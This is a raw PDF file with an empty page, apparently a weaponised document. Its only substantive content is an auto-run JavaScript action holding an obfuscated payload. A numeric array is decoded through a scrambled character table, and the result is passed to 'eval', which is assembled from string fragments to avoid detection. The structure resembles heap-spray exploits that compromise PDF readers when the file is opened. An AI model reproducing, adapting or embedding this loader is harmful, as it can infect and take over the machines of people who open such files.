%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[23,
29,
6,
26,
66,
46,
21,
50,
10,
41,
18,
18,
21,
50,
20,
69,
49,
60,
21,
50,
10,
38,
20,
69,
21,
50,
36,
38,
49,
60,
21,
50,
49,
25,
41,
60,
21,
50,
41,
41,
38,
20,
21,
50,
18,
60,
69,
15,
21,
50,
60,
15,
10,
23,
21,
50,
10,
23,
41,
15,
21,
50,
15,
69,
60,
15,
21,
50,
36,
15,
10,
23,
21,
50,
38,
18,
64,
69,
21,
50,
36,
18,
10,
23,
21,
50,
41,
41,
15,
10,
21,
50,
18,
18,
40,
23,
21,
50,
38,
49,
10,
23,
21,
50,
15,
41,
41,
69,
21,
50,
41,
41,
36,
60,
21,
50,
10,
64,
63,
69,
21,
50,
64,
38,
49,
49,
21,
50,
20,
20,
64,
15,
21,
50,
23,
10,
20,
20,
21,
50,
60,
15,
10,
23,
21,
50,
69,
41,
41,
15,
21,
50,
41,
25,
60,
18,
21,
50,
36,
38,
15,
18,
21,
50,
10,
36,
20,
23,
21,
50,
63,
60,
41,
60,
21,
50,
49,
60,
10,
38,
21,
50,
38,
64,
36,
38,
21,
50,
49,
23,
49,
25,
21,
50,
38,
64,
60,
69,
21,
50,
10,
23,
38,
18,
21,
50,
41,
69,
36,
38,
21,
50,
36,
60,
10,
23,
21,
50,
36,
10,
41,
38,
21,
50,
20,
38,
15,
41,
21,
50,
10,
23,
38,
18,
21,
50,
63,
15,
36,
18,
21,
50,
20,
38,
15,
41,
21,
50,
69,
25,
41,
41,
21,
50,
60,
64,
60,
25,
21,
50,
12,
40,
20,
69,
21,
50,
69,
38,
15,
41,
21,
50,
40,
23,
41,
41,
21,
50,
23,
49,
15,
20,
21,
50,
41,
10,
64,
15,
21,
50,
36,
60,
20,
63,
21,
50,
69,
64,
15,
10,
21,
50,
15,
40,
69,
23,
21,
50,
40,
12,
15,
41,
21,
50,
49,
23,
60,
15,
21,
50,
41,
23,
20,
64,
21,
50,
36,
38,
64,
20,
21,
50,
38,
49,
49,
18,
21,
50,
38,
49,
10,
23,
21,
50,
15,
41,
63,
60,
21,
50,
18,
18,
40,
40,
21,
50,
15,
69,
10,
23,
21,
50,
10,
40,
60,
23,
21,
50,
49,
69,
60,
18,
21,
50,
38,
60,
20,
20,
21,
50,
15,
69,
63,
60,
21,
50,
40,
10,
10,
23,
21,
50,
40,
40,
15,
41,
21,
50,
15,
60,
10,
23,
21,
50,
15,
41,
10,
23,
21,
50,
12,
23,
69,
38,
21,
50,
38,
25,
38,
49,
21,
50,
49,
23,
69,
41,
21,
50,
12,
40,
38,
41,
21,
50,
18,
10,
10,
23,
21,
50,
10,
15,
63,
15,
21,
50,
15,
69,
36,
40,
21,
50,
36,
60,
41,
41,
21,
50,
25,
18,
15,
41,
21,
50,
20,
41,
49,
23,
21,
50,
18,
10,
10,
23,
21,
50,
10,
23,
15,
10,
21,
50,
18,
12,
20,
36,
21,
50,
38,
25,
15,
38,
21,
50,
25,
10,
49,
10,
21,
50,
20,
20,
20,
20,
21,
50,
49,
63,
20,
20,
21,
50,
49,
10,
20,
25,
21,
50,
15,
15,
15,
15,
21,
50,
15,
15,
15,
15,
21,
50,
38,
15,
38,
10,
21,
50,
60,
15,
18,
12,
21,
50,
20,
20,
18,
10,
21,
50,
15,
15,
15,
15,
21,
50,
38,
15,
15,
15,
21,
50,
69,
15,
10,
41,
21,
50,
38,
15,
64,
25,
21,
50,
10,
23,
38,
38,
21,
50,
10,
23,
49,
69,
21,
50,
64,
15,
38,
49,
21,
50,
69,
41,
10,
41,
21,
50,
20,
20,
15,
38,
21,
50,
18,
10,
49,
41,
21,
50,
18,
49,
18,
20,
21,
50,
15,
15,
15,
15,
21,
50,
36,
38,
18,
10,
21,
50,
18,
69,
36,
63,
21,
50,
38,
60,
18,
40,
21,
50,
64,
18,
20,
20,
21,
50,
69,
60,
10,
41,
21,
50,
10,
23,
15,
10,
21,
50,
49,
10,
49,
10,
21,
50,
20,
20,
18,
64,
21,
50,
20,
20,
20,
20,
21,
50,
15,
63,
49,
23,
21,
50,
36,
63,
49,
23,
21,
50,
49,
69,
10,
64,
21,
50,
15,
64,
15,
60,
21,
50,
15,
15,
15,
15,
21,
50,
38,
69,
10,
40,
21,
50,
15,
69,
63,
60,
21,
50,
15,
60,
69,
36,
21,
50,
36,
63,
63,
60,
21,
50,
18,
36,
18,
38,
21,
50,
69,
36,
36,
41,
21,
50,
63,
60,
60,
60,
21,
50,
36,
18,
15,
60,
21,
50,
41,
41,
36,
63,
21,
50,
69,
36,
41,
63,
21,
50,
63,
60,
60,
60,
21,
50,
63,
15,
15,
10,
21,
50,
36,
41,
63,
40,
21,
50,
38,
41,
63,
15,
21,
50,
20,
10,
18,
10,
21,
50,
15,
15,
15,
15,
21,
50,
20,
20,
15,
15,
21,
50,
15,
69,
38,
18,
21,
50,
49,
10,
10,
23,
21,
50,
69,
25,
41,
41,
21,
50,
69,
36,
38,
64,
21,
50,
64,
40,
60,
60,
21,
50,
36,
36,
15,
15,
21,
50,
18,
63,
36,
15,
21,
50,
69,
36,
36,
60,
21,
50,
64,
40,
60,
60,
21,
50,
63,
49,
15,
38,
21,
50,
18,
69,
18,
60,
21,
50,
69,
18,
18,
69,
21,
50,
64,
40,
60,
60,
21,
50,
15,
15,
15,
25,
21,
50,
10,
12,
38,
25,
21,
50,
15,
60,
69,
64,
21,
50,
10,
10,
41,
15,
21,
50,
64,
40,
60,
60,
21,
50,
60,
64,
15,
60,
21,
50,
18,
12,
38,
64,
21,
50,
18,
12,
15,
15,
21,
50,
38,
41,
15,
15,
21,
50,
18,
12,
38,
36,
21,
50,
20,
20,
15,
15,
21,
50,
64,
60,
38,
18,
21,
50,
69,
15,
10,
38,
21,
50,
64,
18,
36,
38,
21,
50,
15,
15,
18,
12,
21,
50,
20,
20,
38,
41,
21,
50,
15,
60,
38,
18,
21,
50,
15,
15,
18,
12,
21,
50,
49,
23,
10,
41,
21,
50,
38,
41,
15,
69,
21,
50,
38,
18,
20,
20,
21,
50,
10,
41,
15,
60,
21,
50,
15,
69,
69,
41,
21,
50,
15,
63,
49,
23,
21,
50,
64,
41,
49,
23,
21,
50,
10,
15,
60,
36,
21,
50,
15,
15,
41,
20,
21,
50,
20,
12,
36,
38,
21,
50,
10,
15,
60,
36,
21,
50,
15,
15,
41,
20,
21,
50,
69,
60,
36,
38,
21,
50,
15,
15,
18,
12,
21,
50,
20,
49,
18,
12,
21,
50,
38,
18,
20,
20,
21,
50,
49,
10,
15,
10,
21,
50,
20,
49,
25,
69,
21,
50,
20,
20,
20,
20,
21,
50,
60,
49,
10,
49,
21,
50,
49,
69,
15,
49,
21,
50,
20,
49,
25,
10,
21,
50,
15,
49,
10,
12,
21,
50,
18,
20,
10,
25,
21,
50,
23,
40,
15,
64,
21,
50,
69,
12,
41,
41,
21,
50,
38,
23,
10,
12,
21,
50,
69,
18,
64,
23,
21,
50,
36,
25,
60,
18,
21,
50,
64,
12,
41,
18,
21,
50,
36,
15,
63,
20,
21,
50,
36,
60,
18,
10,
21,
50,
36,
15,
36,
60,
21,
50,
63,
20,
41,
12,
21,
50,
41,
36,
63,
20,
21,
50,
63,
49,
41,
10,
21,
50,
41,
64,
41,
64,
21,
50,
63,
49,
41,
64,
21,
50,
41,
64,
41,
38,
21,
50,
41,
64,
63,
49,
21,
50,
41,
41,
41,
63,
21,
50,
36,
36,
63,
20,
21,
50,
36,
15,
63,
49,
21,
50,
36,
15,
18,
10,
21,
50,
18,
18,
41,
20,
21,
50,
41,
64,
41,
40,
21,
50,
41,
38,
41,
25,
21,
50,
18,
38,
63,
18,
21,
50,
41,
41,
41,
40,
21,
50,
15,
15,
15,
15,
46,
11,
20,
50,
55,
69,
33,
44,
52,
55,
1,
49,
19,
3,
14,
4,
14,
12,
34,
7,
16,
65,
0,
37,
42,
44,
39,
49,
4,
14,
12,
27,
39,
49,
55,
26,
33,
42,
61,
63,
70,
7,
16,
65,
0,
14,
12,
73,
66,
14,
12,
11,
17,
14,
12,
66,
14,
12,
27,
6,
50,
23,
6,
33,
14,
44,
55,
26,
4,
15,
34,
7,
16,
72,
63,
65,
11,
14,
49,
33,
50,
14,
55,
1,
14,
12,
11,
17,
1,
20,
50,
55,
69,
33,
44,
52,
55,
1,
23,
35,
4,
65,
0,
3,
12,
14,
1,
40,
54,
26,
66,
55,
49,
37,
1,
71,
14,
14,
12,
16,
4,
65,
11,
3,
12,
14,
1,
3,
37,
66,
15,
35,
15,
69,
15,
69,
15,
69,
15,
69,
11,
3,
12,
14,
1,
12,
40,
40,
14,
66,
15,
35,
60,
15,
15,
15,
15,
15,
11,
3,
12,
14,
1,
62,
12,
16,
39,
52,
12,
40,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
23,
29,
6,
26,
65,
11,
3,
12,
14,
1,
6,
69,
75,
39,
49,
55,
66,
62,
12,
16,
39,
52,
12,
40,
27,
39,
49,
55,
26,
33,
42,
61,
63,
11,
3,
12,
14,
1,
7,
16,
66,
12,
40,
40,
14,
74,
4,
6,
69,
75,
39,
49,
55,
73,
15,
35,
41,
10,
65,
11,
3,
12,
14,
1,
16,
12,
14,
6,
62,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
50,
25,
15,
25,
15,
21,
50,
25,
15,
25,
15,
58,
65,
11,
16,
12,
14,
6,
62,
66,
49,
19,
3,
14,
4,
16,
12,
14,
6,
62,
34,
7,
16,
65,
11,
3,
12,
14,
1,
69,
52,
50,
55,
33,
63,
66,
4,
3,
37,
74,
15,
35,
60,
15,
15,
15,
15,
15,
65,
72,
12,
40,
40,
14,
11,
20,
52,
14,
4,
3,
12,
14,
1,
69,
52,
50,
55,
33,
66,
15,
11,
69,
52,
50,
55,
33,
70,
69,
52,
50,
55,
33,
63,
11,
69,
52,
50,
55,
33,
73,
73,
65,
0,
40,
54,
26,
30,
69,
52,
50,
55,
33,
56,
66,
16,
12,
14,
6,
62,
73,
62,
12,
16,
39,
52,
12,
40,
11,
17,
1,
3,
12,
14,
1,
52,
3,
49,
14,
20,
39,
52,
37,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
50,
15,
69,
15,
69,
21,
50,
15,
69,
15,
69,
58,
65,
11,
37,
42,
44,
39,
49,
4,
52,
3,
49,
14,
20,
39,
52,
37,
27,
39,
49,
55,
26,
33,
42,
70,
60,
60,
25,
38,
63,
65,
0,
52,
3,
49,
14,
20,
39,
52,
37,
73,
66,
52,
3,
49,
14,
20,
39,
52,
37,
11,
17,
1,
33,
42,
44,
6,
27,
69,
52,
39,
39,
12,
23,
31,
33,
52,
14,
49,
66,
59,
52,
39,
39,
12,
23,
27,
69,
52,
39,
39,
49,
69,
33,
2,
8,
12,
44,
39,
45,
55,
20,
52,
4,
0,
6,
50,
23,
29,
68,
58,
58,
34,
8,
6,
26,
68,
52,
3,
49,
14,
20,
39,
52,
37,
17,
65,
11,
17,
1,
20,
50,
55,
69,
33,
44,
52,
55,
1,
62,
14,
44,
55,
33,
20,
4,
65,
0,
55,
52,
62,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
50,
15,
71,
15,
71,
21,
50,
15,
71,
15,
71,
21,
50,
15,
71,
15,
71,
21,
50,
15,
71,
15,
71,
58,
65,
11,
3,
12,
14,
1,
62,
12,
16,
39,
52,
12,
40,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
23,
29,
6,
26,
65,
11,
42,
49,
12,
62,
23,
39,
52,
69,
54,
66,
55,
52,
62,
73,
62,
12,
16,
39,
52,
12,
40,
11,
23,
44,
26,
23,
39,
52,
69,
54,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
50,
15,
71,
15,
71,
21,
50,
15,
71,
15,
71,
58,
65,
11,
42,
49,
12,
40,
49,
14,
6,
44,
19,
49,
66,
63,
15,
11,
6,
62,
14,
12,
16,
66,
42,
49,
12,
40,
49,
14,
6,
44,
19,
49,
73,
42,
49,
12,
62,
23,
39,
52,
69,
54,
27,
39,
49,
55,
26,
33,
42,
11,
37,
42,
44,
39,
49,
4,
23,
44,
26,
23,
39,
52,
69,
54,
27,
39,
49,
55,
26,
33,
42,
70,
6,
62,
14,
12,
16,
65,
0,
23,
44,
26,
23,
39,
52,
69,
54,
73,
66,
23,
44,
26,
23,
39,
52,
69,
54,
11,
17,
1,
20,
44,
39,
39,
23,
39,
52,
69,
54,
66,
23,
44,
26,
23,
39,
52,
69,
54,
27,
6,
50,
23,
6,
33,
14,
44,
55,
26,
4,
15,
34,
6,
62,
14,
12,
16,
65,
11,
23,
39,
52,
69,
54,
66,
23,
44,
26,
23,
39,
52,
69,
54,
27,
6,
50,
23,
6,
33,
14,
44,
55,
26,
4,
15,
34,
23,
44,
26,
23,
39,
52,
69,
54,
27,
39,
49,
55,
26,
33,
42,
74,
6,
62,
14,
12,
16,
65,
11,
37,
42,
44,
39,
49,
4,
23,
39,
52,
69,
54,
27,
39,
49,
55,
26,
33,
42,
73,
6,
62,
14,
12,
16,
70,
15,
35,
60,
15,
15,
15,
15,
65,
0,
23,
39,
52,
69,
54,
66,
23,
39,
52,
69,
54,
73,
23,
39,
52,
69,
54,
73,
20,
44,
39,
39,
23,
39,
52,
69,
54,
11,
17,
1,
8,
49,
8,
66,
55,
49,
37,
1,
71,
14,
14,
12,
16,
4,
65,
11,
20,
52,
14,
4,
44,
66,
15,
11,
44,
70,
64,
60,
15,
15,
11,
44,
73,
73,
65,
0,
8,
49,
8,
30,
44,
56,
66,
23,
39,
52,
69,
54,
73,
42,
49,
12,
62,
23,
39,
52,
69,
54,
11,
17,
1,
3,
12,
14,
1,
55,
50,
8,
66,
64,
63,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
25,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
10,
11,
50,
33,
44,
39,
27,
62,
14,
44,
55,
33,
20,
4,
58,
21,
60,
38,
15,
15,
15,
20,
58,
34,
55,
50,
8,
65,
11,
17,
1,
20,
50,
55,
69,
33,
44,
52,
55,
1,
26,
49,
33,
44,
69,
52,
55,
4,
65,
0,
3,
12,
14,
1,
12,
14,
14,
16,
66,
55,
49,
37,
1,
71,
14,
14,
12,
16,
4,
65,
11,
44,
20,
4,
12,
62,
62,
27,
40,
52,
69,
27,
59,
52,
39,
39,
12,
23,
27,
26,
49,
33,
45,
69,
52,
55,
65,
0,
3,
12,
14,
1,
62,
12,
16,
39,
52,
12,
40,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
23,
29,
6,
26,
65,
11,
3,
12,
14,
1,
42,
67,
7,
38,
15,
15,
59,
22,
66,
62,
12,
16,
39,
52,
12,
40,
27,
39,
49,
55,
26,
33,
42,
61,
63,
11,
3,
12,
14,
1,
7,
16,
66,
15,
35,
60,
15,
15,
15,
15,
15,
74,
4,
42,
67,
7,
38,
15,
15,
59,
22,
73,
15,
35,
41,
10,
65,
11,
3,
12,
14,
1,
16,
12,
14,
6,
62,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
50,
25,
15,
25,
15,
21,
50,
25,
15,
25,
15,
58,
65,
11,
16,
12,
14,
6,
62,
66,
49,
19,
3,
14,
4,
16,
12,
14,
6,
62,
34,
7,
16,
65,
11,
3,
12,
14,
1,
62,
38,
71,
29,
24,
18,
38,
20,
66,
4,
15,
35,
15,
69,
15,
69,
15,
69,
15,
69,
74,
15,
35,
60,
15,
15,
15,
15,
15,
65,
72,
15,
35,
60,
15,
15,
15,
15,
15,
11,
20,
52,
14,
4,
3,
12,
14,
1,
3,
7,
69,
43,
57,
25,
18,
16,
66,
15,
11,
3,
7,
69,
43,
57,
25,
18,
16,
70,
62,
38,
71,
29,
24,
18,
38,
20,
11,
3,
7,
69,
43,
57,
25,
18,
16,
73,
73,
65,
0,
12,
14,
14,
16,
30,
3,
7,
69,
43,
57,
25,
18,
16,
56,
66,
16,
12,
14,
6,
62,
73,
62,
12,
16,
39,
52,
12,
40,
11,
17,
1,
3,
12,
14,
1,
33,
13,
28,
42,
22,
23,
53,
37,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
58,
21,
15,
25,
58,
65,
11,
37,
42,
44,
39,
49,
4,
33,
13,
28,
42,
22,
23,
53,
37,
27,
39,
49,
55,
26,
33,
42,
70,
15,
35,
60,
15,
15,
15,
65,
0,
33,
13,
28,
42,
22,
23,
53,
37,
73,
66,
33,
13,
28,
42,
22,
23,
53,
37,
11,
17,
1,
33,
13,
28,
42,
22,
23,
53,
37,
66,
58,
22,
27,
58,
73,
33,
13,
28,
42,
22,
23,
53,
37,
11,
12,
62,
62,
27,
40,
52,
69,
27,
59,
52,
39,
39,
12,
23,
27,
26,
49,
33,
45,
69,
52,
55,
4,
33,
13,
28,
42,
22,
23,
53,
37,
65,
11,
17,
17,
1,
12,
47,
39,
50,
26,
44,
55,
6,
66,
12,
62,
62,
27,
62,
39,
50,
26,
45,
55,
6,
11,
3,
12,
14,
1,
6,
3,
66,
62,
12,
14,
6,
49,
45,
55,
33,
4,
12,
62,
62,
27,
3,
44,
49,
37,
49,
14,
48,
49,
14,
6,
44,
52,
55,
27,
33,
52,
31,
33,
14,
44,
55,
26,
4,
65,
27,
69,
42,
12,
14,
71,
33,
4,
15,
65,
65,
11,
20,
52,
14,
4,
3,
12,
14,
1,
44,
66,
15,
11,
44,
70,
12,
47,
39,
50,
26,
44,
55,
6,
27,
39,
49,
55,
26,
33,
42,
11,
44,
73,
73,
65,
0,
44,
20,
4,
12,
47,
39,
50,
26,
44,
55,
6,
30,
44,
56,
27,
55,
12,
8,
49,
66,
66,
46,
2,
31,
69,
14,
44,
62,
33,
46,
65,
0,
3,
12,
14,
1,
39,
3,
66,
12,
47,
39,
50,
26,
44,
55,
6,
30,
44,
56,
27,
3,
49,
14,
6,
44,
52,
55,
11,
17,
17,
1,
44,
20,
4,
4,
39,
3,
66,
66,
25,
65,
5,
5,
4,
4,
6,
3,
66,
66,
10,
65,
32,
32,
4,
39,
3,
70,
66,
10,
27,
64,
63,
65,
65,
65,
0,
26,
49,
33,
44,
69,
52,
55,
4,
65,
11,
17,
49,
39,
6,
49,
1,
44,
20,
4,
39,
3,
66,
66,
36,
27,
64,
65,
0,
62,
14,
44,
55,
33,
20,
4,
65,
11,
17,
49,
39,
6,
49,
1,
44,
20,
4,
4,
4,
6,
3,
66,
66,
18,
65,
5,
5,
4,
6,
3,
66,
66,
36,
65,
65,
32,
32,
4,
39,
3,
70,
36,
27,
64,
64,
65,
65,
0,
23,
35,
4,
65,
11,
17,
49,
39,
6,
49,
1,
44,
20,
4,
4,
39,
3,
51,
66,
25,
27,
64,
65,
5,
5,
4,
39,
3,
70,
66,
25,
27,
63,
65,
5,
5,
4,
39,
3,
51,
66,
10,
27,
64,
41,
65,
5,
5,
4,
39,
3,
70,
66,
10,
27,
64,
36,
65,
65,
0,
20,
50,
55,
69,
33,
44,
52,
55,
1,
12,
4,
65,
0,
50,
33,
44,
39,
27,
62,
14,
44,
55,
33,
40,
4,
46,
62,
9,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
64,
1,
68,
1,
16,
16,
16,
16,
64,
64,
64,
46,
34,
55,
49,
37,
1,
57,
12,
33,
49,
4,
65,
65,
11,
17,
3,
12,
14,
1,
42,
66,
12,
62,
62,
27,
62,
39,
50,
26,
45,
55,
6,
11,
20,
52,
14,
4,
3,
12,
14,
1,
20,
66,
15,
11,
20,
70,
42,
27,
39,
49,
55,
26,
33,
42,
11,
20,
73,
73,
65,
0,
44,
20,
4,
42,
30,
20,
56,
27,
55,
12,
8,
49,
66,
66,
46,
2,
31,
69,
14,
44,
62,
33,
46,
65,
0,
3,
12,
14,
1,
44,
66,
42,
30,
20,
56,
27,
3,
49,
14,
6,
44,
52,
55,
11,
17,
17,
1,
44,
20,
4,
4,
44,
51,
10,
27,
64,
63,
65,
32,
32,
4,
44,
70,
10,
27,
63,
65,
65,
0,
69,
66,
55,
49,
37,
1,
71,
14,
14,
12,
16,
4,
65,
11,
3,
12,
14,
1,
40,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
46,
21,
50,
25,
15,
25,
15,
21,
50,
25,
15,
25,
15,
46,
65,
11,
3,
12,
14,
1,
49,
66,
50,
55,
49,
6,
69,
12,
62,
49,
4,
23,
29,
6,
26,
65,
11,
37,
42,
44,
39,
49,
4,
40,
27,
39,
49,
55,
26,
33,
42,
70,
66,
15,
35,
10,
15,
15,
15,
65,
0,
40,
73,
66,
40,
11,
17,
40,
66,
40,
27,
6,
50,
23,
6,
33,
14,
4,
15,
34,
15,
35,
10,
15,
15,
15,
74,
49,
27,
39,
49,
55,
26,
33,
42,
65,
11,
20,
52,
14,
4,
20,
66,
15,
11,
20,
70,
63,
25,
15,
15,
11,
20,
73,
73,
65,
0,
69,
30,
20,
56,
66,
40,
73,
49,
11,
17,
12,
4,
65,
11,
12,
4,
65,
11,
33,
14,
16,
0,
33,
42,
44,
6,
27,
8,
49,
40,
44,
12,
27,
55,
49,
37,
47,
39,
12,
16,
49,
14,
4,
55,
50,
39,
39,
65,
11,
17,
69,
12,
33,
69,
42,
4,
49,
65,
0,
17,
12,
4,
65,
11,
17,
17];
cc={q:"{ Ev\(|sqm@8;aUr0y}6zf%NbK9g.Mj[S&t,x7w5ld3hQiI'PVeu>oGkn]D'C4*p21\)=W:c<A/+-_"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF